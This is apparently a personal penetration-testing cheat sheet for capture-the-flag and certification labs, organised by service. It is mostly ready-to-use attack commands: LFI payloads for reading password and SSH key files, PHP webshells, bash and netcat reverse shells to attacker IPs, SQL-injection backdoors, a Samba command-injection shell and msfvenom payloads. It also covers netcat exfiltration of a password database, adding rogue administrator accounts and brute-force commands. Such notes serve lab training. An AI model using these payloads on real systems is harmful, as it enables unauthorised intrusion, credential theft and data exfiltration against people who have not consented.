#I really need to convert this into MD...one day.

Try this one day pls:

python3 /opt/AutoRecon/autorecon.py -vv 10.10.10.17 -o /root/Desktop/htb/


[[# Top]]
+++ **Top**
[#Web_Services Web_services]
[#FTP FTP]
[#SMB SMB]
[#RPC RPC/NFS]
[#SSH SSH]
[#Wordpress Wordpress]
[#Webshell Webshell]
[#SQL SQL]
[#Post_exploitation Post_exploitation]
[#Encoded_files Encoded_files]
[#File_upload_restriction File_upload_restriction]
[#Bash_black_magic Bash_black_magic]
[#SHELL_PATH SHELL_PATH]
[#Netcat_Ninja Netcat_Ninja]
[#Escalation_Time Escalation_Time]
[#Windows Windows]
[#Reverse_Shells Reverse_Shells]






[[# Web_services]]
++ **Web Services**
+++ [#Top Back_to_Top]

>	Enumerate
>	Follow webports
>	Searchsploit Server Software
>	Use LFI to get web config containing passwords
>	Use LFI to get box usernames
>	Re use creds.
>	get LFI
>	get webshell
> 	always send to burp and start crafting packets


If PHP is confirmed to be on server but LFI is not returning anything you try telling the webpage to wrap the contents up in base64:
>	http://192.168.29.141/index.php?page=php://filter/convert.base64-encode/resource=config
I assume this works because if you call any PHP file by itself the script either runs or security systems prevent the contents from being displayed, if they get wrapped in base64 first they are obfuscated past such techniques.

An example of headers being abused: 
We can see that the LANG parameter gets set as a cookie from index.php source code which we exfiltrated via PHP wrapper LFI.
>	//setcookie("lang","en.lang.php");
 - we upload a malicious file and then send a GET request, specifying LANG as the name of the uploaded malicious file which we obtain by inspecting the servers response after we upload.
>	Cookie: lang=../upload/f3035846cc279a1aff73b7c2c25367b9.gif - **IMPORTANT NOTE, there will be no feedback if you specify the wrong path in edited request - it is up to you to figure out correct path traversal to hit your upload.
(you can also use curl for this) curl -v --cookie "lang=../upload/f3035846cc279a1aff73b7c2c25367b9.gif"


Webdav?
>	davtest -url http://<ip>
can you get to a .php page? If so look at page source, is it sending GET? If so try CURL for local file inclusion vuln by sending a POST request through for GET
> 	curl -X POST –k https://targetIP/file_view.php -d "file=../../../../../etc/passwd"
(HTTP POST requests supply additional data from the client (browser) to the server in the message body. In contrast, GET requests include all required data in the URL.)
**IT IS TIME TO MAKE YOUR OWN WORDLISTS**
Directories:
>	gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.11.1.73 -t 50 -x <asp, aspx,php,etc>
>	gobuster dir  -w /usr/share/wordlists/dirb/common.txt -u http://10.11.1.73:8080/php -t 50 -x <asp, php, etc>
>	gobuster dir -u http://10.10.10.121 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -t 50 -x <asp,aspx,php, etc>
Gobuster Requires -k flag for 443




**LFI:**
Sometimes you can call commands but NOT directories, how NEAT

>	index.php?username=<command>         /eg nc <ip/port> /ls   etc

Tomcat directory traversal: 
>	code.php?=../../../../../../etc/tomcat<X>/tomcat-users.xml
Apache/other: 
>	/var/www/html/config.php or similar paths to get SQL etc creds
?page=php://filter/convert.base64-encode/resource=../config.php
../../../../../boot.ini to find out windows version


**For burp example look at [*http://lerned.wdfiles.com/local--files/test/burp.PNG THIS] image.**

WHAT HAS HAPPENED?
A malicious .gif was uploaded - but no obvious LFI was here.
So we intercepted a request that occurs when using a button on panel.php - it exposed the load function along with &continue=continue which must appended to complete the request. As the malicious code contained '<?php passthru($_GET['cmd']); ?>' we then specify cmd in the POST header, which executes as seen in the response.

Then to send reverse shell we try bash and nc oneliners, only to land on the php -r oneliner, it MUST be sent with all characters encoded to URL

**Example of sanitisation vuln [*http://lerned.wikidot.com/local--files/test/php.PNG HERE]**

WHAT IS HAPPENING HERE?
The $page variable is unsanitised, which means it can be called in php language to execute system commands, the one used here is index');system('id');# - it calls index as the page, and then escapes to run ID. Getting a shell from here is trivial index');system('nc 192.168.254.132 444 -e /bin/sh');#

Linux:
>	/etc/passwd
>	/etc/shadow
>	/etc/issue
>	/etc/group
>	/etc/hostname
>	/etc/ssh/ssh_config
>	/etc/ssh/sshd_config
>	/root/.ssh/id_rsa
>	/root/.ssh/authorized_keys
>	/home/user/.ssh/authorized_keys
>	/home/user/.ssh/id_rsa

Apache:
Configuration Files:
>	/etc/apache2/apache2.conf
>	/usr/local/etc/apache2/httpd.conf
>	/etc/httpd/conf/httpd.conf

Log Files:
>	Red Hat/CentOS/Fedora Linux-   /var/log/httpd/access_log
>	Debian/Ubuntu-   /var/log/apache2/access.log
>	FreeBSD-   /var/log/httpd-access.log

Generic:
>	/var/log/apache/access.log
>	/var/log/apache/error.log
>	/var/log/apache2/access.log
>	/var/log/apache/error.log

MySql:
>	/var/lib/mysql/mysql/user.frm
>	/var/lib/mysql/mysql/user.MYD
>	/var/lib/mysql/mysql/user.MYI

Windows:
>	/boot.ini
>	/autoexec.bat
>	/windows/system32/drivers/etc/hosts
>	/windows/repair/SAM
>	/windows/panther/unattended.xml
>	/windows/panther/unattend/unattended.xml

**RFI:**
Have your PHP/cgi downloader ready
<?php include $_GET['inc']; ?> simplest backdoor to keep it dynamic without anything messing your output
Then you can just http://$IP/inc.php?inc=http://$YOURIP/bg.php and have full control with minimal footprint on target machine
get phpinfo()

PHP command injection from GET Request

<?php echo system($_GET["cmd"]);?>

Alternative
<?php echo shell_exec($_GET["cmd"]);?>

**Sending shell back to yourself via BURP POST request**

Create an index.php file on your host and add this content to it
>	bash -i >& /dev/tcp/YOUR_HOST/443 0>&1

Send the following request using burp to the host

>	POST /index.php?page=ping.php HTTP/1.1
>	Host: <target_ip>
>	User-Agent: xxxxxxxxxxxxxxxxxxxxxxx
>	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
>	Accept-Language: en-US,en;q=0.5
>	DNT: 1
>	Referer: https://<target_ip>/index.php?page=ping.php
>	Connection: close
>	Content-Type: application/x-www-form-urlencoded
>	Content-Length: 55
>	
>	ip=127.0.0.1%0awget <attacker_ip> -O shell&send=Ping+It%21

this will download the index file of your host as “shell”
rerun the job using

>	GET /index.php?page=job.php&job=JOB_ID HTTP/1.1
>	Host: <target_ip>
>	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
>	Accept-Language: en-US,en;q=0.5
>	DNT: 1
Now to execute the reverse shell set the ip parameter to 127.0.0.1%0abash shell
And again find the job it and run it

And you’re done


[[# FTP]]
++ **FTP**
+++ [#Top Back_to_Top]
Remember to hydra any usernames you get from anywhere

in browser
>	ftp://<ipaddress>/<path>

cmd
>	ftp <ipaddress>

To set local upload directory (eg where you established your FTP connection from will be where you can upload files from)
>	lcd
To upload/download files to/from there
>	put <file> / get <file>

Spin up FTP server (much like HTTP server)
>	pip install pyftpdlib
>	python -m pyftpdlib -p 21 -w (-w flag allows anonymous write access)

On windows:
>	ftp -A 10.11.0.40
**REMEMBER FOR EXE's CHANGE SESSION TO BINARY VIA TYPING "binary" IN YOUR FTP SESSION!!!"

Bruteforce
>	hydra -l admin -P /usr/share/wordlists/rockyou.txt -vV 10.11.1.128 ftp
 Try the output of usernames from enum4linux as the user and pass list
>	hydra -L users.txt -P users.txt 192.168.29.138 ftp


[[# SMB]]
++ **SMB**
+++ [#Top Back_to_Top]
Bruteforce:
>	crackmapexec -t 50 smb 10.10.10.178 -u ./users.txt -p ./pass.txt --continue-on-success

>	smbmap -R -u root -p '' -H 10.10.10.178
>	smbmap -u guest -H 10.10.10.178

Samba 3.0.20 insta-root one-liner
>	 smb: \> logon "./=`nohup nc 10.10.16.44 443 -e /bin/bash`"

>	enum4linux -a <target>
>	nmap --script smb-os-discovery.nse
>	https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon_enum/smbver.sh

searchsploit versions that comeup from the above

>	smbclient -L <target> *if anon access is allowed specify "-N" for no password at the end

**Windows**: 
>	smbclient //target/wwwroot -U anonymous **TAKE NOTE OF FORWARD SLASHES**
>	mount -t cifs //10.10.10.134/Backups -o user=guest,password= ~/mnt/backups
>	Attack large user list with hydra: hydra -t 1 -V -f -L LIST_OF_USERS -p KNOWNPASWORD <>IP_ADDRESS> smb
>	Use impacket tool "./GetNPUsers.py DOMAIN/USER -no-pass" or the user list version to see if an account is authorised for sign on without password through kerberos - then crack the returned hash
>	use rpcclient to gather further info on a user: rpcclient _U "" -N IP_ADDRESS and then rpdcclient $> queryuser <USER>


Mount shares
to mount:
> 	smb://<target>

Directly exploitable MSxx-xxx versions?

SMB Vulnerability Scan
>	nmap -p 445 -vv —script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse <target>

Users and shares scan

>	nmap -p 445 -vv —script=smb-enum-shares.nse,smb-enum-users.nse <target>

snmp-check <target>

 https://github.com/hatlord/snmpwn
 
steps for mounting vhd
>	smbclient -L 10.10.10.134
>	mount -t cifs //10.10.10.134/Backups -o user=guest,password= ~/mnt/backups
>	apt-get install libguestfs-tools
>	guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --ro /mnt/vhd/ -m /windows
>	guestmount --add ~/mnt/backups/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd

[[# RPC]]
++ **RPC/NFS**
Run nmpa scripts against rpc bind in sparta to find nfs shares
make sure your kali has nfs-common package installed
Run show mount against the NFS port in sparta
>	mkdir /tmp/nfs
>	mount -t nfs 192.168.254.133:/home/vulnix /tmp/nfs OR you can mount in file explorer via nfs://192.168.254.133:/tmp/nfs


[[# SSH]]
++ **SSH**
+++ [#Top Back_to_Top]
Refer to your [http://lerned.wikidot.com/ssh notes] if stuck
Run hydra against any usernames you get from anywhere


[[# Wordpress]]
++ **Wordpress**
+++ [#Top Back_to_Top]
wpscan -u <target>/wp/ --enumerate
check wordpress version against searchsploit
/var/www/wordpress/wp-config.php - check for passwords

>	wpscan --url https://192.168.29.138:12380/blogblog/ --enumerate u --disable-tls-checks / --stealthy
>	wpscan --url https://192.168.29.138:12380/blogblog/ --passwords /usr/share/wordlists/rockyou.txt --usernames john
>	wpscan -u http://10.10.10.10 –enumerate p –enumerate u –enumerate t>>

To get a shell:
you can either edit a theme to contain mal php code
    or you can spin a malicious plugin together with that fancy python script
          OR you can simply upload a php rev shell as a plugin - it will give you an error but if you check:
>	literally.vulnerable:65535/phpcms/wp-content/uploads/2020/02/shell.php
you should find it


SSL errors in your python exploit?
add the below:
import ssl
ssl._create_default_https_context = ssl._create_unverified_context

[[# Webshell]]
++ **Webshell**
+++ [#Top Back_to_Top]
Make your own:
>	<?php echo system($_REQUEST["e"]); ?>
Navigate to you script
>	http://192.168.29.149/view.php?page=../../usr/databases/1.php&e=whoami
test which commands can and can't be run
test which commands will let you pipe eg id, echo, cat etc
try good old echoing bash reverse shell oneliner and piping to bash

>	<?php echo shell_exec($_GET[‘cmd’]).’ 2>&1’); ?>

[[# SQL]]
++ **SQL**
+++ [#Top Back_to_Top]
Review your [http://lerned.wikidot.com/sql-stuff notes] SQL is a rabbit hole
For webpages follow notes on injection.
In enumeration results look for anything that resembles a user defined function, chances are Raptor will work in this case.
Can you login? create yourself a backdoor
>	 mysql -u root -p wordpress -h 192.168.29.138
>	 select "<?php echo shell_exec($_GET['cmd']);?>" into outfile '/var/www/https/blogblog/wp-content/uploads/shell.php';

Can you inject? create yourself a backdoor
# windows
>	?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
# linux
>	?id=1 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'

Wanna jump back into a temp shell?

>	system bash;
>	\! bash;

[[# Post_exploitation]]
++ **Post Exploitation**
+++ [#Top Back_to_Top]

[https://netsec.ws/?p=337 Upgrade]:
In reverse shell
>	$ python -c 'import pty; pty.spawn("/bin/bash")'
>	$ python3 -c 'import pty; pty.spawn("/bin/bash")'
>	Ctrl-Z

In Kali
>	$ stty raw -echo
>	$ fg and then enter, wait a sec, then reset enter
>	export TERM=linux
ALT
>	stty -a
>	stty raw -echo
>	fg
>	stty rows x
>	stty cols x

scan for SUID commands you can run:
>	find / -perm -u=s -type f 2>/dev/null
>	sudo -l
(look for binaries that will allow you to cheat yourself into  root shell, doas, crontab, custom binaries etc)
Infiltrate linenum straight away after this
Check for services running inside the box that are not externally accessible, then either set up local port forward or ssh proxy.

To find all files that are world writeable, irrespective of what other permissions they have:

>	find / -perm -o+w 


When running sudo -l remember to carefully look at what is returned eg
>	/usr/bin/vi /var/www/html/*
means that you can ran 
>	sudo /usr/bin/vi /var/www/html/

See if you're a member of any groups and check what that group can access
>	id
>	find / -group adm 2> /dev/null

See if there MORE web directories hosted that you were unable to enumerate.

/etc/apache2/ports.conf show another website? Two ways to port forward, locally from inside machine or by using SSH proxy if you have creds:

Let's say ports.conf is listening locally on 127.0.0.1:8080 (if you find there is another webpage running it's conf may be in opt)

>	socat TCP-LISTEN:5000,fork,reuseaddr tcp:127.0.0.1:8080

>	ssh -L 8080:localhost:8080 user@machine
>	password: password

Always run the below in /home/ and /var/www/
>	find . -type f -iname "*password*"

No WGET? Use curl to PIPE a script into bash
Test "locate" command
Cat .bash_history
Can you steal ssh keys?
Grep -R <anything>
Edit passwd or read shadow?
run ps -eo command to see what is running on server
for i in $(ps -eo command); do echo $i; done
IFS=$'\n'
If you already have credentials has someone "reused" them somehwere else? Try su/sudoing.
Remember to check backup locations eg /var/backups to see if you can access shadow, .ssh keys, config etc

*Enumerate installed packages*

>	dpkg -l

All of these will list the packages rather than the programs however. If you truly want to list the programs, you probably want to list the executables in your $PATH, which can be done like so using bash's compgen:

compgen -c

Or, if you don't have compgen:

#!/bin/bash
IFS=: read -ra dirs_in_path <<< "$PATH"

for dir in "${dirs_in_path[@]}"; do
    for file in "$dir"/*; do
        [[ -x $file && -f $file ]] && printf '%s\n' "${file##*/}"
    done
done

No wget cos you in windows?
>	powershell "(new-object System.Net.WebClient).Downloadfile('http://IP/FILE', 'name_of_file_to_be_created')"  
>	powershell -command "((new-object System.Net.WebClient).DownloadFile('http://127.0.0.1:8000/shell.exe', '%TEMP%\shell.exe'))"; "c:\windows\system32\cmd.exe /c %TEMP%\shell.exe"

No powershell?
>	certutil -urlcache -split -f [serverURL] FILE_TO_BE_SAVED.EXTENSION

Need to get your files out? NC is the easiest if you can get it on
>	root@kali:~# nc -lnvp 443 > key.kdbx
>	C:\nc.exe -v -w 2 10.10.16.54 443 < CEH.kdbx

[[# Encoded_files]]
++ **Encoded Files**
+++ [#Top Back_to_Top]
check for headers for your decode output eg png header:
>	nano encoded.txt | base64 —decode > out.png

Once you have password to a file run the file with PW as arg1

"The directory I pivoted myself into had 2 .txt files with base64 encoding in them and 1 python script which seems to encrypt any string given as an argument.
As below the script had to be modified from A to B so that instead of encoding plain text it would decode base64 back into plain text:"

>	    def decodeString(str):
>	    string = str[::-1]
>	    string = string.encode("rot13")
>	    return base64.b64decode(string)
>	
>	    print decodeString(sys.argv[1])

Modified to:

>	    import base64,codecs,sys
>	
>	    def encodeString(str):
>	    base64string= base64.b64encode(str)
>	    return codecs.encode(base64string[::-1], 'rot13')
>	
>	    def decodeString(str):
>	    string = str[::-1]
>	    string = string.encode("rot13")
>	    return base64.b64decode(string)

    print decodeString(sys.argv[1])


[[# File_upload_restriction]]:
++ **File Upload Restriction**
+++ [#Top Back_to_Top]
try simply apending allowed extension to payload. "shell.php.png was used to bypass the web application filtering, the file was still executed as PHP (likely due to incorrectly configured Apache MIME types)."
"In Apache, the mappings between MIME types and file extensions are stored in the configuration file apache_home/conf/mime.types, where apache_home is the path under which Apache was installed on your server."

>	?file=secret.doc%00.pdf
^^will result in the Java application seeing a string that ends with ".pdf" and the operating system will see a file that ends in ".doc". Attackers may use this trick to bypass validation routines. 

example of getting around upload restrictions by uploading allowed format and then renaming to a string containing a character that terminates
>	cadaver http://10.11.1.229
>	put test.asp test.txt
>	mv test.txt test.asp;txt

msfvenom can wrap up shells as various file types remember: 
> 	root@kali:~# msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.254.133 LPORT=1337 -f war > shell.war
>	root@kali:~# msfvenom -p windows/shell/reverse_tcp lhost=10.11.0.40 lport=1337 -f asp > test.asp

For more advanced file restrictions it can get tricky EG swagshop.
I had to obtain a copy of a plugin which contains certain xml wfiles with ceratin parameters INCLUDING the MD5 of index.php
Once I had injected a payload I had to amend the MD5 in xml.

[[# Bash_black_magic]]
++ **Bash Black Magic**
+++ [#Top Back_to_Top]
"make the admin home directory fully accessible by leveraging the fact I have access to chmod in /home/admin. The command is "echoing" my string (which is a command to run chmod with an argument and then a vector) into the "runthis" file which automatically runs. VERY FUkIN COOL.

> bash-4.1$ echo "/home/admin/chmod -R 777 /home/admin/" » /tmp/runthis - this was some funky monkey voodoohoodoo bizzo lemme tell you

Linux PROOF
>	hostname && whoami && cat proof.txt && /sbin/ifconfig

[[# SHELL_PATH]]
++ **Shell Path**
+++ [#Top Back_to_Top]
https://www.cyberciti.biz/faq/unix-linux-adding-path/
Type 'export -p' to see the exported variables in the shell. What this will also show you is which variables are read-only.
check path/shell: echo "$PATH"
change the path to SHELL and PATH, so instead of SHELL being rbash it is now simply BASH (can run more commands) and PATH gives me all the commands
>	export SHELL=/bin/bash:/path/to/more:$SHELL
>	export PATH=/usr/bin:/path/to/more:$PATH
sometimes you need to put appendage BEFORE existing PATH, I ahve had the below work for me.
>	PATH=/usr/bin/:/bin/:/home/ryuu/usr/bin
>	export PATH
[[# Netcat_Ninja]]
++ **Netcat Ninja**
+++ [#Top Back_to_Top]
https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/
openBSD uses nc.traditional
**Port knocking:**
> nc -vz <target> <port>
Enum robots.txt in scan: 
> nc -A <target>
**Throw a shell:** 
> nc -e /bin/bash <target> <port>
**Send a file using netcat:** 
> nc -nv <target> <port> < /all/the/exploits
**Create a reverse shell with Ncat using cmd.exe on Windows:** 
> nc.exe -nlvp 4444 -e cmd.exe / nc.exe -nv <Remote IP> <Remote Port> -e cmd.exe
**Listen on port w/ssl:** 
> ncat <args> <target> <port> —ssl


[[# Windows]]
++ **Windows**
+++ [#Top Back_to_Top]
https://github.com/abatchy17/WindowsExploits
https://github.com/lucyoa/kernel-exploits
[http://lerned.wikidot.com/powershell-weapon Legit powershell shit]

PowerUp: Privilege escalation checks
Grab latest scripts from  [https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc HERE]
>	powershell "(new-object System.Net.WebClient).Downloadfile('http://IP/FILE', 'name_of_file_to_be_created')"
>	powershell -nop -ep bypass
>	import-module C:\users\whowveryouare\Documents\powerup.ps1
>	invoke-allchecks


**Non-interactive execute powershell file**

powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1

**Windows proof**

hostname && whoami.exe && type proof.txt && ipconfig /all

**File transfers reverse shell**
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/file.exe','C:\Users\user\Desktop\file.exe')"

Search entire directory for xml files for passwords
>	dir /b /s *.xml
>	findstr /si password *.txt
>	findstr /si password *.xml
>	findstr /si password *.ini

/in powershell
>	PS C:\> get-childitem -path C:\ -filter *.ps1 -recurse -erroraction silentlycontinue -force

upload paths
>	create c:\temp
>	C:\windows\system32\spool\drivers\color\

Look for stored credentials
>	cmdkey /list
>	runas /savecred /user:<user>"c:\users\Public\nc.exe -nv 10.11.1.1 44 -e cmd.exe"

Bypass UAC
>	powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt

See if you have token impersonation rights - if so infiltrate churrasco (confirmed working on w2k3)
Take note of groups you are a member of -some have none privesc exploits EG [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise DnsAdmins]
>	whoami /all

Feed contents of systeminfo into https://www.exploit-db.com/exploits/39719 for local exploits

Check LOCAL listening ports which you may be able to port forward
either with plink or local commands
>	netstat -ano

Can use accesschk.exe (infiltrate it) to show us required Priv level for each service
>	accesschk.exe -ucqv Spooler /accepteula

Can you use procexp.exe (infiltrate it) to enumerate processes? (remember pspy?)
>	cmd /c procexp64.exe -accepteula 

Add users
>	net user shrek shrekt123 /add
>	net localgroup administrators shrek /add

++ **Escalation Time!**
+++ [[# Escalation_Time]]
+++ [#Top Back_to_Top]
https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
For all (x86) windows try the below (for OSCP labs try manual techniques FIRST)
>	https://www.exploit-db.com/exploits/40564
Try some of the techniques in [https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html HERE]

To upgrade your multihandler to full meterpreter use post/multi/manage/shell_to_meterpreter

++ **Reverse Shells**
+++ [[# Reverse_Shells]]
+++ [#Top Back_to_Top]
remember to consider what is running in the background, EG servers that run java need to execute JSP files as WAR, some servers execute their perl scripts as CGI etc
EG IIS server we spin up:
>	msfvenom -p windows/shell/reverse_tcp lhost=10.10.14.22 lport=443 -f aspx
to catch with multi handler (uploaded with cadaver - would not execute as html so uploaded as aspx)

Payloads
for payloads run:
> msfvenom --list payloads | grep linux/x86

### Metasploit general stuff
 ** _rhosts will accept domain name_  
 ** Remember to make use of the aux scanners:  
 ** `use auxiliary/scanner/http/rails_xml_yaml_scanner`  
 
